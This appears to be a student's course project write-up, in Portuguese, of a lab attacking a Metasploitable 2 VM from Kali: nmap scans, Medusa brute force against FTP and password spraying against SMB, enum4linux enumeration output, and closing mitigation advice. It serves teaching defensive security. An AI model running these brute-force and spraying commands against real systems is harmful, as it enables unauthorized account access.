# Dio.CYBER
Entrega do projeto - Curso Dio  Cybersegurança. 

Descrição do Desafio
Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (por exemplo, Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

Configurar o ambiente: duas VMs (Kali Linux e Metasploitable 2) no VirtualBox, com rede interna (host-only).
Executar ataques simulados: força bruta em FTP, automação de tentativas em formulário web (DVWA) e password spraying em SMB com enumeração de usuários.
Documentar os testes: wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.


IP Metasploitable --> 192.168.1.67
==Reconhcimento do alvo ==
nmap -sV 192.168.1.67 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 08:34 -0400
Nmap scan report for 192.168.1.67
Host is up (0.0039s latency).                                                                                                                                          
Not shown: 977 closed tcp ports (reset)                                                                                                                                
PORT     STATE SERVICE     VERSION                                                                                                                                     
21/tcp   open  ftp         vsftpd 2.3.4                                                                                                                                
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)                                                                                                
23/tcp   open  telnet      Linux telnetd                                                                                                                               
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapenuped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:F8:D8:0B (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

== Varredura de portas FTP e SMB ==
kali㉿kali)-[~]
└─$ nmap -p 21,139,445 -sV 192.168.1.67
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 08:36 -0400
Nmap scan report for 192.168.1.67
Host is up (0.00053s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:F8:D8:0B (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

==Criação de wordlists==
---------------------------------------------------------------------------
cat > ~/laboratorio/medusa/wordlists/users.txt <<'EOF'
msfadmin
user
test
admin
EOF
---------------------------------------------------------------------------
cat > ~/laboratorio/medusa/wordlists/passwords.txt <<'EOF'
msfadmin
password
123456
test
EOF
---------------------------------------------------------------------------

==Ataque Medusa==
medusa \
  -h 192.168.56.11 \
  -U ~/laboratorio/medusa/wordlists/users.txt \
  -P ~/laboratorio/medusa/wordlists/passwords.txt \
  -M ftp \
  -t 2 \
  -f \
  -O ~/laboratorio/medusa/resultados/ftp.txt

> Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2026-10-05 08:42:07 ACCOUNT CHECK: [ftp] Host: 192.168.1.67 (1 of 1, 0 complete) User: msfadmin (1 of 4, 0 complete) Password: msfadmin (1 of 4 complete)
2026-10-05 08:42:07 ACCOUNT FOUND: [ftp] Host: 192.168.1.67 User: msfadmin Password: msfadmin [SUCCESS]
2026-10-05 08:42:10 ACCOUNT CHECK: [ftp] Host: 192.168.1.67 (1 of 1, 0 complete) User: msfadmin (1 of 4, 1 complete) Password: password (2 of 4 complete)
---------------------------------------------------------------------------------------

==Password spraying em SMB==
Verificação de módulo disponível;
medusa -d | grep -i smb
edusa -d | grep -i smb
    + smbnt.mod : Brute force module for SMB (SMBv1-3, Signing, LM/NTLM/LMv2/NTLMv2) sessions : version 3.0

'smbnt'
---------------------------------------------------------------------------------------
medusa \
  -h 192.168.1.67 \
  -U ~/laboratorio/medusa/wordlists/spray-users.txt \
  -p 'msfadmin' \
  -M smbnt \
  -t 1 \
  -f \
  -O ~/laboratorio/medusa/resultados/smb-spray.txt

==Enumeração ==

(kali㉿kali)-[~]
└─$ enum4linux  -a 192.168.1.67 | tee enum4linux.txt
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Oct  5 08:52:25 2026

 =========================================( Target Information )=========================================

Target ........... 192.168.1.67
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 192.168.1.67 )============================

                                                                                 
[+] Got domain/workgroup name: WORKGROUP                                         
                                                                                 
                                                                                 
 ================================( Nbtstat Information for 192.168.1.67 )================================                                                         
                                                                                 
Looking up status of 192.168.1.67                                                
        METASPLOITABLE  <00> -         B <ACTIVE>  Workstation Service
        METASPLOITABLE  <03> -         B <ACTIVE>  Messenger Service
        METASPLOITABLE  <20> -         B <ACTIVE>  File Server Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 192.168.1.67 )===================================                                                          
                                                                                 
                                                                                 
[+] Server 192.168.1.67 allows sessions using username '', password ''           
                                                                                 
                                                                                 
 ================================( Getting domain SID for 192.168.1.67 )================================                                                          
                                                                                 
Domain Name: WORKGROUP                                                           
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup             
                                                                                 
                                                                                 
 ===================================( OS information on 192.168.1.67 )===================================                                                         
                                                                                 
                                                                                 
[E] Can't get OS info with smbclient                                             
                                                                                 
                                                                                 
[+] Got OS info for 192.168.1.67 from srvinfo:                                   
        METASPLOITABLE Wk Sv PrQ Unx NT SNT metasploitable server (Samba 3.0.20-Debian)
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03


 =======================================( Users on 192.168.1.67 )=======================================                                                          
                                                                                 
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,        Desc: (null)
index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin) Desc: (null)
index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,Desc: (null)
index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager       Desc: (null)
index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

 =================================( Share Enumeration on 192.168.1.67 )=================================                                                          
                                                                                 
                                                                                 
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            PC-TRANPORTE-NA

[+] Attempting to map shares on 192.168.1.67                                     
                                                                                 
//192.168.1.67/print$   Mapping: DENIED Listing: N/A Writing: N/A                
//192.168.1.67/tmp      Mapping: OK Listing: OK Writing: N/A
//192.168.1.67/opt      Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                   
                                                                                 
NT_STATUS_NETWORK_ACCESS_DENIED listing \*                                       
//192.168.1.67/IPC$     Mapping: N/A Listing: N/A Writing: N/A
//192.168.1.67/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A

 ============================( Password Policy Information for 192.168.1.67 )============================                                                         
                                                                                 
Password:                                                                        


[+] Attaching to 192.168.1.67 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] METASPLOITABLE
        [+] Builtin

[+] Password Info for Domain: METASPLOITABLE

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                             
                                                                                 
                                                                                 
Password Complexity: Disabled                                                    
Minimum Password Length: 0


 =======================================( Groups on 192.168.1.67 )=======================================                                                         
                                                                                 
                                                                                 
[+] Getting builtin groups:                                                      
                                                                                 
                                                                                 
[+]  Getting builtin group memberships:                                          
                                                                                 
                                                                                 
[+]  Getting local groups:                                                       
                                                                                 
                                                                                 
[+]  Getting local group memberships:                                            
                                                                                 
                                                                                 
[+]  Getting domain groups:                                                      
                                                                                 
                                                                                 
[+]  Getting domain group memberships:                                           
                                                                                 
                                                                                 
 ==================( Users on 192.168.1.67 via RID cycling (RIDS: 500-550,1000-1050) )==================                                                          
                                                                                 
                                                                                 
[I] Found new SID:                                                               
S-1-5-21-1042354039-2475377354-766472396                                         

[+] Enumerating users using SID S-1-5-21-1042354039-2475377354-766472396 and logon username '', password ''                                                       
                                                                                 
S-1-5-21-1042354039-2475377354-766472396-500 METASPLOITABLE\Administrator (Local User)
S-1-5-21-1042354039-2475377354-766472396-501 METASPLOITABLE\nobody (Local User)
S-1-5-21-1042354039-2475377354-766472396-512 METASPLOITABLE\Domain Admins (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-513 METASPLOITABLE\Domain Users (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-514 METASPLOITABLE\Domain Guests (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1000 METASPLOITABLE\root (Local User)
S-1-5-21-1042354039-2475377354-766472396-1001 METASPLOITABLE\root (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1002 METASPLOITABLE\daemon (Local User)
S-1-5-21-1042354039-2475377354-766472396-1003 METASPLOITABLE\daemon (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1004 METASPLOITABLE\bin (Local User)
S-1-5-21-1042354039-2475377354-766472396-1005 METASPLOITABLE\bin (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1006 METASPLOITABLE\sys (Local User)
S-1-5-21-1042354039-2475377354-766472396-1007 METASPLOITABLE\sys (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1008 METASPLOITABLE\sync (Local User)
S-1-5-21-1042354039-2475377354-766472396-1009 METASPLOITABLE\adm (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1010 METASPLOITABLE\games (Local User)
S-1-5-21-1042354039-2475377354-766472396-1011 METASPLOITABLE\tty (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1012 METASPLOITABLE\man (Local User)
S-1-5-21-1042354039-2475377354-766472396-1013 METASPLOITABLE\disk (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1014 METASPLOITABLE\lp (Local User)
S-1-5-21-1042354039-2475377354-766472396-1015 METASPLOITABLE\lp (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1016 METASPLOITABLE\mail (Local User)
S-1-5-21-1042354039-2475377354-766472396-1017 METASPLOITABLE\mail (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1018 METASPLOITABLE\news (Local User)
S-1-5-21-1042354039-2475377354-766472396-1019 METASPLOITABLE\news (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1020 METASPLOITABLE\uucp (Local User)
S-1-5-21-1042354039-2475377354-766472396-1021 METASPLOITABLE\uucp (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1025 METASPLOITABLE\man (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1026 METASPLOITABLE\proxy (Local User)
S-1-5-21-1042354039-2475377354-766472396-1027 METASPLOITABLE\proxy (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1031 METASPLOITABLE\kmem (Domain Group)

== Mitigação de danos ===

8. Medidas de mitigação
O projeto deve terminar com recomendações, não somente com credenciais encontradas.
FTP
desabilitar FTP simples;
usar SFTP ou FTPS;
desabilitar login anônimo;
limitar tentativas;
aplicar bloqueio temporário;
monitorar logs.
SMB
desabilitar SMBv1;
restringir portas 139 e 445 por firewall;
usar senhas fortes e MFA quando disponível;
limitar privilégios;
bloquear contas após tentativas excessivas;
evitar reutilização de senhas.
Aplicação web
aplicar rate limiting;
usar CAPTCHA adaptativo;
bloquear ou atrasar tentativas repetidas;
utilizar MFA;
proteger contra CSRF;
registrar IP, usuário e horário;
não revelar se o usuário existe;
armazenar senhas com hash forte e salt.


  



